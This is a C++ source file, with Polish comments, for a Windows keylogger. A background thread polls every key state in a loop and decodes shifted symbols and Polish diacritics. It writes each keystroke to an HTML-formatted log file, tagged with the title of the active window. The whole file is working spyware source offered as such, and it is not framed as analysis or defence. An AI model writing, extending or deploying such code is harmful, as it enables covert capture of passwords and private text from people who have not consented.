#include "Keylogger.h"

const int VK_OEM_PERIOD = 190; // . kropka
const int VK_OEM_MINUS = 189; // -
const int VK_OEM_COMMA = 188; // , przecinek
const int VK_OEM_PLUS = 187; // = (obok backspace)

Keylogger::Keylogger() {
    this->config = new Config();
    this->newWinApix = new newWinApi();
}

DWORD WINAPI watekRejestrowaniaKlawiszy(LPVOID* theArg) {
    Sleep(2000);
    Keylogger *key = new Keylogger();
    Window *window = new Window();
    Log *log = new Log();
    Config *config = new Config();
    newWinApi *newWinApix = new newWinApi();
    if (!log->fileExist(config->GetLogFileName()))
        log->createNewLog(config->GetLogFileName());

    string znak = " ";
    string logFileName = config->GetLogFileName();
    while (1) {
        for (short character = 8; character <= 222; character++) {
            if (newWinApix->PobierzKlawiszAsync()(character) == -32767) {
                znak = key->getPressedKey(character);
                if (znak != "\0") {
                    if (window->isNewWindow())
                        log->addNewLog(logFileName, window->getLastWindowName(), key->getPressedKey(character));
                        //                        cout << endl << endl << window->getLastWindowName() << endl << key->getPressedKey(character);
                    else
                        //                        cout << key->getPressedKey(character);
                        log->addLog(logFileName, key->getPressedKey(character));
                }
            }
        }
    }
}

void Keylogger::startLogging() {
    DWORD threadID;
    DWORD thread_arg = 0;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) watekRejestrowaniaKlawiszy, &thread_arg, 0, &threadID);
}

void Keylogger::stopLogging() {
    //TODO
}

string Keylogger::getPressedKey(short character) {

    if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU)) {
        //[PL] Same Duże polskie znaki
        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x4C) && this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT))
            return "Ł";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x41) && this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT))
            return "Ą";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x43) && this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT))
            return "Ć";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x45) && this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT))
            return "Ę";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x4E) && this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT))
            return "Ń";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x4F) && this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT))
            return "Ó";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x53) && this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT))
            return "Ś";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x58) && this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT))
            return "Ź";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x5A) && this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT))
            return "Ż";


        //[PL] Same małe Polskie znaki
        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x4C))
            return "ł";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x41))
            return "ą";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x43))
            return "ć";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x45))
            return "ę";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x4E))
            return "ń";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x4F))
            return "ó";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x53))
            return "ś";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x58))
            return "ź";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(0x5A))
            return "ż";


    }

    if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT)) {

        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(0x31))
            return "!";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(0x32))
            return "@";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(0x33))
            return "#";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(0x34))
            return "$";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(0x35))
            return "%";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(0x36))
            return "^";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(0x37))
            return "&";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(0x38))
            return "*";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(0x39))
            return "(";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(0x30))
            return ")";


        //--------kropkinawiasy
        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_OEM_1))
            return ":";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_OEM_2))
            return "?";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_OEM_3))
            return "~";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_OEM_4))
            return "{";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_OEM_5))
            return "|";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_OEM_6))
            return "}";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_OEM_7))
            return "\"";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_OEM_PLUS))
            return "+";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_OEM_MINUS))
            return "_";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_OEM_COMMA))
            return "<";


        if (this->newWinApix->PobierzKlawiszAsync()(VK_LSHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_OEM_PERIOD))
            return ">";

    }
    //-------------------------------------------------------- MALE NORMALNE


    if (this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT)) {

        if (this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT) && (character >= 65 && character <= 90)) {
            return this->shortToString(character);
        }



        if (this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_SPACE)) {
            //spacja z shiftem
            return " ";
        }

        if (this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT) && this->newWinApix->PobierzKlawiszAsync()(VK_SHIFT)) {
            //trzymanie shifta
            return "";
        }

    }

    //anty trzymanie alta i ctrl

    if (this->newWinApix->PobierzKlawiszAsync()(VK_MENU) && this->newWinApix->PobierzKlawiszAsync()(VK_MENU)) {
        //trzymanie ALT prawy
        return "";
    }

    if (this->newWinApix->PobierzKlawiszAsync()(VK_CONTROL) && this->newWinApix->PobierzKlawiszAsync()(VK_CONTROL)) {
        //trzymanie CONTROLA
        return "";
    }

    //F1-F12
    if (this->newWinApix->PobierzKlawiszAsync()(VK_F1))
        return this->addSpan("[F1]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_F2))
        return this->addSpan("[F2]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_F3))
        return this->addSpan("[F3]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_F4))
        return this->addSpan("[F4]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_F5))
        return this->addSpan("[F5]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_F6))
        return this->addSpan("[F6]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_F7))
        return this->addSpan("[F7]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_F8))
        return this->addSpan("[F8]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_F9))
        return this->addSpan("[F9]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_F10))
        return this->addSpan("[F10]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_F11))
        return this->addSpan("[F11]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_F12))
        return this->addSpan("[F12]");


    //STRZAŁKI
    if (this->newWinApix->PobierzKlawiszAsync()(VK_UP))
        return "";

    if (this->newWinApix->PobierzKlawiszAsync()(VK_LEFT))
        return "";

    if (this->newWinApix->PobierzKlawiszAsync()(VK_DOWN))
        return "";

    if (this->newWinApix->PobierzKlawiszAsync()(VK_RIGHT))
        return "";

    //SPECJALNE DODATKOWE
    if (this->newWinApix->PobierzKlawiszAsync()(VK_INSERT))
        return this->addSpan("[INS]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_DELETE))
        return this->addSpan("[DEL]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_HOME))
        return this->addSpan("[HOME]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_END))
        return this->addSpan("[END]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_PRIOR))
        return this->addSpan("[PgUP]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_NEXT))
        return this->addSpan("[PgDn]");

    //NUM LOCK KLAWISZE
    if (this->newWinApix->PobierzKlawiszAsync()(VK_NUMLOCK))
        return this->addSpan("[Num Lock]");

    if (this->newWinApix->PobierzKlawiszAsync()(VK_MULTIPLY))
        return this->addSpan("[Num Lock]");


    //            VK_ADD	
    //            VK_SEPARATOR	
    //            VK_SUBTRACT	
    //            VK_DECIMAL	
    //            VK_DIVIDE	
    //


    //


    if ((character >= 39)&&(character <= 64)) {
        return this->shortToString(character);


    } else if ((character > 64)&&(character < 91)) {
        character += 32;
        return this->shortToString(character);


    } else {
        switch (character) {

            case VK_SPACE:
                return " ";

            case VK_SHIFT:
                //return "[SHIFT]";

            case VK_RETURN:
                return this->addSpan("[ENTER]<br>");

            case VK_BACK:
                return this->addSpan("[BACKSPACE]");

            case VK_TAB:
                return this->addSpan("[TAB]");

            case VK_CONTROL:
                //fputs("[CTRL]",file);

            case VK_DELETE:
                return this->addSpan("[DEL]");

            case VK_OEM_1:
                return ";";

            case VK_OEM_2:
                return "/";

            case VK_OEM_3:
                return "`";

            case VK_OEM_4:
                return "[";

            case VK_OEM_5:
                return "\\";

            case VK_OEM_6:
                return "]";

            case VK_OEM_7:
                return "\'";

            case VK_OEM_PLUS: ///////////
                return "=";

            case VK_OEM_COMMA:
                return ",";

            case VK_OEM_MINUS:
                return "-";

            case VK_OEM_PERIOD:
                return ".";

                ///////////
            case VK_NUMPAD0:
                return "0";

            case VK_NUMPAD1:
                return "1";

            case VK_NUMPAD2:
                return "2";

            case VK_NUMPAD3:
                return "3";

            case VK_NUMPAD4:
                return "4";

            case VK_NUMPAD5:
                return "5";

            case VK_NUMPAD6:
                return "6";

            case VK_NUMPAD7:
                return "7";

            case VK_NUMPAD8:
                return "8";

            case VK_NUMPAD9:
                return "9";

            case VK_CAPITAL:
                return this->addSpan("[CAPS LOCK]");
                //TODO SPRAWDZ CZY WLACZONY CZY WYLACZONY Caps Lock

            default:
                return "";
        }
    }
}

string Keylogger::shortToString(short shortValue) {
    char character;
    character = (char) shortValue;
    stringstream ss;
    string tmpString;
    ss << character;
    ss >> tmpString;
    return tmpString;
}

string Keylogger::addSpan(string character) {
    return "<span class=\"sK\">" + character + "</span>";
}
